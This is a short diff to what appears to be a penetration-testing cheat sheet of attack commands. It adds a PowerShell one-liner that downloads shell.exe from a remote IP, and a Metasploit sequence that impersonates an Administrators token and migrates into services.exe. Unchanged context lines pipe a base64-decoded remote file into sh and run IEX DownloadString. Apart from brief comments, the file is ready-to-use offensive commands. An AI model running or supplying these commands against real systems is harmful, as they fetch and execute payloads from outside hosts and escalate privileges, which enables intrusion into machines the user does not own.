@@ -108,6 +108,7 @@ sudo python -m SimpleHTTPServer 80 #Start HTTP server
 curl 10.10.10.10/lp.enc | base64 -d | sh #Download from the victim
 
 In Powershell:
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.18.11.136:8000/shell.exe','shell.exe')"
 IEX(New-Object Net.WebClient).DownloadString('http://...')
 
 # POWERSHELL (powershell, ps)
@@ -454,6 +455,14 @@ set RPORT 22
 set LHOST tun0
 set LPORT 1337
 run -j
+
+# METASPLOIT (metasploit, windows, token)
+load incognito
+list_tokens -g
+impersonate_token "BUILTIN\Administrators" 
+getuid
+ps (find services.exe PID)
+migrate 668 (services.exe PID)
 
 Database:
 sudo msfdb run
